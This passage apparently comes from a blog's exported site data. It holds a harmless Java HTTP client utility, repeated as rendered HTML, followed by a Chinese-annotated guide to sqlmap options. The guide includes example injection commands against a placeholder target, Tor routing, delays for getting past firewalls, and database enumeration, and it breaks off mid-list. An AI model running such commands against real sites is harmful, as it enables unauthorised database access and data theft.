class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package util;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.omg.CORBA.portable.OutputStream;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.net.HttpURLConnection;</span><br><span class=\"line\">import java.net.URL;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 发送与接收都是String  接收到String类型的返回后自己用fastJson转一下</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class HttpClientUtil &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * url为地址，params 为请求参数 如 id=1&amp;name=xx</span><br><span class=\"line\">     * @param url</span><br><span class=\"line\">     * @param params</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static  Map get(String url, String params)&#123;</span><br><span class=\"line\">        HttpURLConnection connection = null;</span><br><span class=\"line\">        BufferedReader br = null;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            URL send_url = params.equals(&quot;&quot;) ? new URL(url) : new URL(url + &quot;?&quot; + params);</span><br><span class=\"line\">            connection = (HttpURLConnection) send_url.openConnection();</span><br><span class=\"line\">            connection.setRequestMethod(&quot;GET&quot;);</span><br><span class=\"line\">            //一些设置</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Connection&quot;,&quot;keep-alive&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Accept-Charset&quot;,&quot;utf8, gbk; q=0.6&quot;);</span><br><span class=\"line\">            //content-type浏览器会自动解析</span><br><span class=\"line\">            //connection.setRequestProperty(&quot;Content-Type&quot;,&quot;application/json&quot;);</span><br><span class=\"line\">            //connection.setDoOutput(true);</span><br><span class=\"line\">            connection.setUseCaches(false);</span><br><span class=\"line\"></span><br><span class=\"line\">            connection.connect();</span><br><span class=\"line\">            headers = connection.getHeaderFields();</span><br><span class=\"line\"></span><br><span class=\"line\">            br = new BufferedReader(new InputStreamReader(connection.getInputStream(),&quot;UTF-8&quot;));</span><br><span class=\"line\">            String line = &quot;&quot;;</span><br><span class=\"line\">            while ((line = br.readLine()) != null)&#123;</span><br><span class=\"line\">                sb.append(line);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            res.put(&quot;headers&quot;,headers);</span><br><span class=\"line\">            res.put(&quot;response&quot;, sb);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;http_get 异常！&quot;);</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(connection != null)&#123;</span><br><span class=\"line\">                    connection.disconnect();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(br != null)&#123;</span><br><span class=\"line\">                    br.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (Exception e2)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * params为postc参数</span><br><span class=\"line\">     * @param url</span><br><span class=\"line\">     * @param params</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static  Map post(String url, String params)&#123;</span><br><span class=\"line\">        HttpURLConnection connection = null;</span><br><span class=\"line\">        BufferedReader br = null;</span><br><span class=\"line\">        OutputStreamWriter out = null;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            URL send_url = new URL(url);</span><br><span class=\"line\">            connection = (HttpURLConnection)send_url.openConnection();</span><br><span class=\"line\"></span><br><span class=\"line\">            connection.setRequestMethod(&quot;POST&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Connection&quot;, &quot;Keep-Alive&quot;);</span><br><span class=\"line\">            connection.setUseCaches(false);</span><br><span class=\"line\">            //以后就可以使用conn.getOutputStream().write()</span><br><span class=\"line\">            connection.setDoOutput(true);</span><br><span class=\"line\">            //以后就可以使用conn.getInputStream().read();</span><br><span class=\"line\">            connection.setDoInput(true);</span><br><span class=\"line\"></span><br><span class=\"line\">            out = new OutputStreamWriter(connection.getOutputStream(),&quot;UTF-8&quot;);</span><br><span class=\"line\">            out.write(params);</span><br><span class=\"line\">            out.flush();</span><br><span class=\"line\"></span><br><span class=\"line\">            headers = connection.getHeaderFields();</span><br><span class=\"line\">            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            while ((line = br.readLine()) != null)&#123;</span><br><span class=\"line\">                sb.append(line);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            res.put(&quot;headers&quot;,headers);</span><br><span class=\"line\">            res.put(&quot;response&quot;,sb.toString());</span><br><span class=\"line\">        &#125;catch (Exception e1)&#123;</span><br><span class=\"line\">            e1.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(connection != null)&#123;</span><br><span class=\"line\">                    connection.disconnect();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(br != null)&#123;</span><br><span class=\"line\">                    br.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(out != null)&#123;</span><br><span class=\"line\">                    out.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (Exception e2)&#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void xxxx()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String args[])&#123;</span><br><span class=\"line\">//        Map&lt;String,Object&gt; res = get(&quot;http://127.0.0.1:8080/test1&quot;,&quot;&quot;);</span><br><span class=\"line\">//        System.out.println(res.get(&quot;response&quot;));</span><br><span class=\"line\">//        System.out.println(res.get(&quot;headers&quot;));</span><br><span class=\"line\">//        Map&lt;String,List&lt;String&gt;&gt; headers  = (Map&lt;String, List&lt;String&gt;&gt;)res.get(&quot;headers&quot;);</span><br><span class=\"line\">//        System.out.println(headers.get(&quot;Content-Type&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">        String params = &quot;&#123;\\n&quot; +</span><br><span class=\"line\">                &quot;    \\&quot;status\\&quot;: 0,\\n&quot; +</span><br><span class=\"line\">                &quot;    \\&quot;data\\&quot;: \\&quot;hello world!\\&quot;\\n&quot; +</span><br><span class=\"line\">                &quot;&#125;&quot;;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = post(&quot;http://127.0.0.1:8080/test2&quot;,params);</span><br><span class=\"line\">        System.out.println(res.get(&quot;response&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package util;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.omg.CORBA.portable.OutputStream;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.net.HttpURLConnection;</span><br><span class=\"line\">import java.net.URL;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 发送与接收都是String  接收到String类型的返回后自己用fastJson转一下</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class HttpClientUtil &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * url为地址，params 为请求参数 如 id=1&amp;name=xx</span><br><span class=\"line\">     * @param url</span><br><span class=\"line\">     * @param params</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static  Map get(String url, String params)&#123;</span><br><span class=\"line\">        HttpURLConnection connection = null;</span><br><span class=\"line\">        BufferedReader br = null;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            URL send_url = params.equals(&quot;&quot;) ? new URL(url) : new URL(url + &quot;?&quot; + params);</span><br><span class=\"line\">            connection = (HttpURLConnection) send_url.openConnection();</span><br><span class=\"line\">            connection.setRequestMethod(&quot;GET&quot;);</span><br><span class=\"line\">            //一些设置</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Connection&quot;,&quot;keep-alive&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Accept-Charset&quot;,&quot;utf8, gbk; q=0.6&quot;);</span><br><span class=\"line\">            //content-type浏览器会自动解析</span><br><span class=\"line\">            //connection.setRequestProperty(&quot;Content-Type&quot;,&quot;application/json&quot;);</span><br><span class=\"line\">            //connection.setDoOutput(true);</span><br><span class=\"line\">            connection.setUseCaches(false);</span><br><span class=\"line\"></span><br><span class=\"line\">            connection.connect();</span><br><span class=\"line\">            headers = connection.getHeaderFields();</span><br><span class=\"line\"></span><br><span class=\"line\">            br = new BufferedReader(new InputStreamReader(connection.getInputStream(),&quot;UTF-8&quot;));</span><br><span class=\"line\">            String line = &quot;&quot;;</span><br><span class=\"line\">            while ((line = br.readLine()) != null)&#123;</span><br><span class=\"line\">                sb.append(line);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            res.put(&quot;headers&quot;,headers);</span><br><span class=\"line\">            res.put(&quot;response&quot;, sb);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;http_get 异常！&quot;);</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(connection != null)&#123;</span><br><span class=\"line\">                    connection.disconnect();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(br != null)&#123;</span><br><span class=\"line\">                    br.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (Exception e2)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * params为postc参数</span><br><span class=\"line\">     * @param url</span><br><span class=\"line\">     * @param params</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static  Map post(String url, String params)&#123;</span><br><span class=\"line\">        HttpURLConnection connection = null;</span><br><span class=\"line\">        BufferedReader br = null;</span><br><span class=\"line\">        OutputStreamWriter out = null;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer();</span><br><span class=\"line\">        Map&lt;String,List&lt;String&gt;&gt; headers;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            URL send_url = new URL(url);</span><br><span class=\"line\">            connection = (HttpURLConnection)send_url.openConnection();</span><br><span class=\"line\"></span><br><span class=\"line\">            connection.setRequestMethod(&quot;POST&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json&quot;);</span><br><span class=\"line\">            connection.setRequestProperty(&quot;Connection&quot;, &quot;Keep-Alive&quot;);</span><br><span class=\"line\">            connection.setUseCaches(false);</span><br><span class=\"line\">            //以后就可以使用conn.getOutputStream().write()</span><br><span class=\"line\">            connection.setDoOutput(true);</span><br><span class=\"line\">            //以后就可以使用conn.getInputStream().read();</span><br><span class=\"line\">            connection.setDoInput(true);</span><br><span class=\"line\"></span><br><span class=\"line\">            out = new OutputStreamWriter(connection.getOutputStream(),&quot;UTF-8&quot;);</span><br><span class=\"line\">            out.write(params);</span><br><span class=\"line\">            out.flush();</span><br><span class=\"line\"></span><br><span class=\"line\">            headers = connection.getHeaderFields();</span><br><span class=\"line\">            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            while ((line = br.readLine()) != null)&#123;</span><br><span class=\"line\">                sb.append(line);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            res.put(&quot;headers&quot;,headers);</span><br><span class=\"line\">            res.put(&quot;response&quot;,sb.toString());</span><br><span class=\"line\">        &#125;catch (Exception e1)&#123;</span><br><span class=\"line\">            e1.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(connection != null)&#123;</span><br><span class=\"line\">                    connection.disconnect();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(br != null)&#123;</span><br><span class=\"line\">                    br.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if(out != null)&#123;</span><br><span class=\"line\">                    out.close();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (Exception e2)&#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void xxxx()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String args[])&#123;</span><br><span class=\"line\">//        Map&lt;String,Object&gt; res = get(&quot;http://127.0.0.1:8080/test1&quot;,&quot;&quot;);</span><br><span class=\"line\">//        System.out.println(res.get(&quot;response&quot;));</span><br><span class=\"line\">//        System.out.println(res.get(&quot;headers&quot;));</span><br><span class=\"line\">//        Map&lt;String,List&lt;String&gt;&gt; headers  = (Map&lt;String, List&lt;String&gt;&gt;)res.get(&quot;headers&quot;);</span><br><span class=\"line\">//        System.out.println(headers.get(&quot;Content-Type&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">        String params = &quot;&#123;\\n&quot; +</span><br><span class=\"line\">                &quot;    \\&quot;status\\&quot;: 0,\\n&quot; +</span><br><span class=\"line\">                &quot;    \\&quot;data\\&quot;: \\&quot;hello world!\\&quot;\\n&quot; +</span><br><span class=\"line\">                &quot;&#125;&quot;;</span><br><span class=\"line\">        Map&lt;String,Object&gt; res = post(&quot;http://127.0.0.1:8080/test2&quot;,params);</span><br><span class=\"line\">        System.out.println(res.get(&quot;response&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"sqlmap","date":"2018-08-28T07:30:54.000Z","_content":"使用sqlmap需要自己先找到注入点\n## 1.sqlmap 用户文档\n用户文档来自 https://blog.csdn.net/u012763794/article/details/52638931</br>\n-v VERBOSE 输出信息的详细程度\n\t# Verbosity level.\n\t# Valid: integer between 0 and 6\n\t# 0: Show only error and critical messages  只显示错误和关键信息\n\t# 1: Show also warning and info messages    警告和信息\n\t# 2: Show also debug messages               调试信息\n\t# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)',(..)\"(\"\n\t# 4: Show also HTTP requests                整个GET报文都看到了\n\t# 5: Show also HTTP responses' headers         返回报文的头部\n\t# 6: Show also HTTP responses' page content    返回的html代码都有了\n\t# Default: 1\n Request: 请求\n\tThese options can be used to specify how to connect to the target URL\n\n\t--method=METHOD     Force usage of given HTTP method (e.g. PUT)\n\t\t指定HTTP请求的方法，GET，POST，PUT，MOVE等\n\t--data=DATA         Data string to be sent through POST\n\t\t指定POST的参数\n\t--param-del=PARA..  Character used for splitting parameter values\n\t\t这个拆分一些参数的，如下面用;拆分post参数\n\t\tpython sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"query=foobar;id=1\" --param-del=\";\" -f --banner --dbs --users\n\t--cookie=COOKIE     HTTP Cookie header value\n\t\t指定cookie值\n\t--cookie-del=COO..  Character used for splitting cookie values\n\t\t指定分割cookie值的字符是什么\n\t--load-cookies=L..  File containing cookies in Netscape/wget format\n\t\t这个是从文件中读取cookie吧，Netscape/wget格式的\n\t--drop-set-cookie   Ignore Set-Cookie header from response\n\t\t忽略响应包的Set-Cookie头\n\t--user-agent=AGENT  HTTP User-Agent header value\n\t\t指定User-Agent用户代理\n\t--random-agent      Use randomly selected HTTP User-Agent header value\n\t\t随机选用sqlmap目录中的User-Agent，这个文件再txt目录\n\t--host=HOST         HTTP Host header value\n\t\t指定主机头\n\t--referer=REFERER   HTTP Referer header value\n\t\t指定Referer头，就是请求来源的意思\n\t-H HEADER, --hea..  Extra header (e.g. \"X-Forwarded-For: 127.0.0.1\")\n\t\t指定某个头部，如： -H \"X-Forwarded-For: 127.0.0.1\"\n\t--headers=HEADERS   Extra headers (e.g. \"Accept-Language: fr\\nETag: 123\")\n\t\t这个的话应该是可以指定多个，用\\n分割\n\t--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)\n\t\t指定http认证类型\n\t--auth-cred=AUTH..  HTTP authentication credentials (name:password)\n\t\t指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证\n\t--auth-file=AUTH..  HTTP authentication PEM cert/private key file\n\t\t指定一个私钥文件来认证\n\t--ignore-401        Ignore HTTP Error 401 (Unauthorized)\n\t\t忽略401错误\n\t--proxy=PROXY       Use a proxy to connect to the target URL\n\t\t指定代理\n\t--proxy-cred=PRO..  Proxy authentication credentials (name:password)\n\t\t指定代理的认证信息，就是账号密码\n\t--proxy-file=PRO..  Load proxy list from a file\n\t\t从文件中选择代理\n\t--ignore-proxy      Ignore system default proxy settings\n\t\t忽略系统默认代理\n\t--tor               Use Tor anonymity network\n\t\t使用tor网络\n\t--tor-port=TORPORT  Set Tor proxy port other than default\n\t\t设置tor的端口，如果不是默认端口的话\n\t--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))\n\t\t设置tor代理的类型\n\t--check-tor         Check to see if Tor is used properly\n\t\t检测tor能不能用\n\t--delay=DELAY       Delay in seconds between each HTTP request\n\t\t设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过\n\t--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)\n\t\t设置超时时间，默认30秒\n\t--retries=RETRIES   Retries when the connection timeouts (default 3)\n\t\t设置重试的次数，默认3次\n\t--randomize=RPARAM  Randomly change value for given parameter(s)\n\t\t随机地更改给定参数的值\n\t--safe-url=SAFEURL  URL address to visit frequently during testing\n\t\t有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求\n\t\t这里提供一个安全不错误的连接，每隔一段时间都会去访问一下\n\t--safe-post=SAFE..  POST data to send to a safe URL\n\t\t这里设置一个正确的post数据\n\t--safe-req=SAFER..  Load safe HTTP request from a file\n\t\t从文件中读取安全，或者叫正确的http请求\n\t--safe-freq=SAFE..  Test requests between two visits to a given safe URL\n\t\t设置访问安全url的时间间隔\n\t--skip-urlencode    Skip URL encoding of payload data\n\t\t不进行url编码\n\t--csrf-token=CSR..  Parameter used to hold anti-CSRF token\n\t\t设置CSRF的token\n\t--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token\n\n\t--force-ssl         Force usage of SSL/HTTPS\n\t\t强制使用https\n\t--hpp               Use HTTP parameter pollution method\n\t\t尝试了一下，只能用于ASP，得到报错信息如下：\n\t\t[WARNING] HTTP parameter pollution should work only against ASP(.NET) targets\n\n\t--eval=EVALCODE     Evaluate provided Python code before the request (e.g.\n\t\t\t\t\t\t\"import hashlib;id2=hashlib.md5(id).hexdigest()\")\n\t\t发送请求之前，先运行这段python代码，比如对某个参数进行处理\n\t\t比如下面的，hash参数就是id的md5值\n\t\tpython sqlmap.py -u \"http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc\n    509a6f75849b\" --eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\"\n\nFingerprint:</br>\n-f, --fingerprint   Perform an extensive DBMS version fingerprint\n\t这个应该是数据库指纹识别，加了可能识别更好</br>\n\nEnumeration:</br>\nThese options can be used to enumerate the back-end database\nmanagement system information, structure and data contained in the\ntables. Moreover you can run your own SQL statements</br>\n-a, --all           Retrieve everything</br>\n\t检索所有，这是拖库的节奏啊</br>\n-b, --banner        Retrieve DBMS banner</br>\n\t检索数据库的一些标志性的信息，就是指纹这样子吧</br>\n--current-user      Retrieve DBMS current user</br>\n\t检索当前连接数据库的用户</br>\n--current-db        Retrieve DBMS current database</br>\n\t检索当前连接的数据库</br>\n--hostname          Retrieve DBMS server hostname</br\n\t检索服务器的主机名</br>\n--is-dba            Detect if the DBMS current user is 